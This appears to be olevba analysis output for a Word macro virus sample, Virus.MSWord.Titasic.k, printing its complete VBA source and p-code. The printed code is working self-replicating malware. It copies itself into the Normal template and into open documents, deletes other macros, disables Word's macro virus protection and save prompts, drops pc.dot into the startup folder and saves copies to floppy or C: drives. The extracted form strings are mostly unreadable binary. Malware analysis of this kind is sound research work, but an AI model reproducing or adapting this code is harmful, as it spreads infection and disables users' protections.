olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Pure.bas 
in file: ./Virus.MSWord.Titasic.k - OLE stream: 'Macros/VBA/Pure'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public Lain As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function Main()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "Pure"
nmak(1) = "Coffee"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "pc.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "pc.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\pc.src"
End If

Buang aDes
With aDes.VBProject
If Not (Not hapus And .Description = "Pure" And .VBComponents.Count > 2) Then
    Tempel aSrc, aDes, nmak
    hapus = False
    .Description = "Pure"
    If aDes = NT Then
        Options.SaveInterval = 0
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Siip ... sesuatu yang diproteksi itu terkadang memang lebih aman", vbInformation, "Pure Coffee !"
End Function

Sub Buang(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then Lain = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Pure" And nmak.Name <> "Coffee" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Tempel(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
Main
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    Main
    End If
    Next
End If
Chika

End Sub
Sub ViewVBCode()
WBT
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
Main
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "pc.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
Main
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\pc.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\pc.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Buang ActiveDocument
If Lain Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".astia.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Please ... beri gue kesempatan untuk menetap di sini !"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVBCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Buang aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 0
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Coffee" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "pc.dot" Then Main
nyebar
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Sub nyebar()
On Error GoTo sia
If Dir("a:\chika.doc") = "" Then
    ActiveDocument.SaveAs "a:\chika.doc"
    ActiveDocument.Saved = True
    ActiveDocument.Close
Else
    ActiveDocument.SaveAs "c:\chika.doc"
    ActiveDocument.Saved = True
    ActiveDocument.Close
End If
sia:
End Sub
Sub Chika()
On Error GoTo sia2
If WeekDay(Date) = 3 Then
    Application.Visible = False
    Coffee.Show
End If
sia2:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Coffee.frm 
in file: ./Virus.MSWord.Titasic.k - OLE stream: 'Macros/VBA/Coffee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































Private Sub CommandButton1_Click()
Unload Me
Application.Visible = True
End
End Sub



Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Titasic.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Pure - 10801 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #1:
' 	Dim (Public) 
' 	VarDefn Lain (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #2:
' 	FuncDefn (Function Main())
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #4:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #5:
' 	Dim 
' 	VarDefn aSrc
' Line #6:
' 	OnError selesai 
' Line #7:
' 	LitStr 0x0004 "Pure"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #8:
' 	LitStr 0x0006 "Coffee"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #9:
' Line #10:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #12:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #14:
' 	Ld aSrc 
' 	LitStr 0x0006 "pc.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #15:
' 	Ld NT 
' 	St aSrc 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #20:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #21:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #22:
' 	Ld aSrc 
' 	LitStr 0x0006 "pc.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #23:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #24:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\pc.src"
' 	Concat 
' 	St aSrc 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Ld aDes 
' 	ArgsCall Buang 0x0001 
' Line #28:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #29:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0004 "Pure"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Tempel 0x0003 
' Line #31:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #32:
' 	LitStr 0x0004 "Pure"
' 	MemStWith Description 
' Line #33:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #35:
' 	Ld NT 
' 	St CustomizationContext 
' Line #36:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #37:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #38:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	GoTo Aksi 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndWith 
' Line #44:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #45:
' 	ArgsCall Refresh 0x0000 
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Label Aksi 
' Line #48:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #49:
' 	ExitFunc 
' Line #50:
' 	Label selesai 
' Line #51:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0040 "Siip ... sesuatu yang diproteksi itu terkadang memang lebih aman"
' 	Ld vbInformation 
' 	LitStr 0x000D "Pure Coffee !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #52:
' 	EndFunc 
' Line #53:
' Line #54:
' 	FuncDefn (Sub Buang(Sfile))
' Line #55:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #56:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #57:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Lain 
' 	EndIf 
' Line #58:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0004 "Pure"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0006 "Coffee"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #60:
' 	Ld reset 
' 	IfBlock 
' Line #61:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub Tempel(Sfile, Dfile, nmak))
' Line #69:
' 	Dim 
' 	VarDefn aNmak
' Line #70:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #71:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #72:
' 	StartForVariable 
' 	Next 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub FileOpen())
' Line #75:
' 	ArgsCall WBT 0x0000 
' Line #76:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #77:
' 	ArgsCall WBF 0x0000 
' Line #78:
' 	ArgsCall AutoOpen 0x0000 
' Line #79:
' 	ElseBlock 
' Line #80:
' 	ArgsCall WBF 0x0000 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub AutoOpen())
' Line #84:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #85:
' 	ArgsCall Main 0x0000 
' Line #86:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #88:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #89:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #90:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #91:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #92:
' 	ArgsCall Main 0x0000 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ArgsCall Chika 0x0000 
' Line #97:
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub ViewVBCode())
' Line #100:
' 	ArgsCall WBT 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub AutoExec())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #105:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #106:
' 	ArgsCall Main 0x0000 
' Line #107:
' 	ArgsCall WBT 0x0000 
' Line #108:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #109:
' 	ArgsCall WBF 0x0000 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub AutoExit())
' Line #114:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #115:
' 	OnError batal 
' Line #116:
' 	ArgsCall WBT 0x0000 
' Line #117:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #118:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #119:
' 	LitVarSpecial (True)
' 	St afound 
' Line #120:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #121:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0006 "pc.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #122:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' Line #124:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #125:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #126:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #127:
' 	ArgsCall Main 0x0000 
' Line #128:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #129:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\pc.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #130:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\pc.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #131:
' 	EndWith 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #134:
' 	Label batal 
' Line #135:
' 	ArgsCall WBF 0x0000 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub ToolsMacro())
' Line #138:
' 	ArgsCall WBF 0x0000 
' Line #139:
' 	OnError batal 
' Line #140:
' 	Ld ActiveDocument 
' 	ArgsCall Buang 0x0001 
' Line #141:
' 	Ld Lain 
' 	IfBlock 
' Line #142:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0011 ".astia.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #143:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #144:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #145:
' 	LitStr 0x0036 "Please ... beri gue kesempatan untuk menetap di sini !"
' 	MemStWith Description 
' Line #146:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #147:
' 	EndWith 
' Line #148:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #149:
' 	ElseBlock 
' Line #150:
' 	ArgsCall ViewVBCode 0x0000 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	Label batal 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub FileTemplates())
' Line #155:
' 	ArgsCall WBF 0x0000 
' Line #156:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub FormatStyle())
' Line #159:
' 	ArgsCall WBF 0x0000 
' Line #160:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Function Refresh())
' Line #163:
' 	LitVarSpecial (True)
' 	St reset 
' Line #164:
' 	ArgsCall FileTemplates 0x0000 
' Line #165:
' 	Ld aDes 
' 	ArgsCall Buang 0x0001 
' Line #166:
' 	EndFunc 
' Line #167:
' 	FuncDefn (Sub AutoClose())
' Line #168:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #169:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #171:
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #172:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #173:
' 	EndWith 
' Line #174:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0006 "Coffee"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "pc.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Main 0x0000 
' 	EndIf 
' Line #175:
' 	ArgsCall nyebar 0x0000 
' Line #176:
' 	EndSub 
' Line #177:
' 	FuncDefn (Sub FileExit())
' Line #178:
' 	ArgsCall AutoExit 0x0000 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Sub ToolsOptions())
' Line #181:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #182:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #183:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Function WBT())
' Line #186:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #187:
' 	EndFunc 
' Line #188:
' 	FuncDefn (Function WBF())
' Line #189:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #190:
' 	EndFunc 
' Line #191:
' 	FuncDefn (Sub nyebar())
' Line #192:
' 	OnError sia 
' Line #193:
' 	LitStr 0x000C "a:\chika.doc"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #194:
' 	LitStr 0x000C "a:\chika.doc"
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #195:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #196:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	LitStr 0x000C "c:\chika.doc"
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #199:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #200:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	Label sia 
' Line #203:
' 	EndSub 
' Line #204:
' 	FuncDefn (Sub Chika())
' Line #205:
' 	OnError sia2 
' Line #206:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #207:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #208:
' 	Ld Coffee 
' 	ArgsMemCall Show 0x0000 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	Label sia2 
' Line #211:
' 	EndSub 
' Line #212:
' Macros/VBA/Coffee - 2059 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #45:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #46:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt Visible 
' Line #47:
' 	End 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #53:
' Line #54:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!---������������������������������������������������������������������������������������������������������������������������������888���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������888
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!!!!---������������������������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!---���������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������------������������������������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
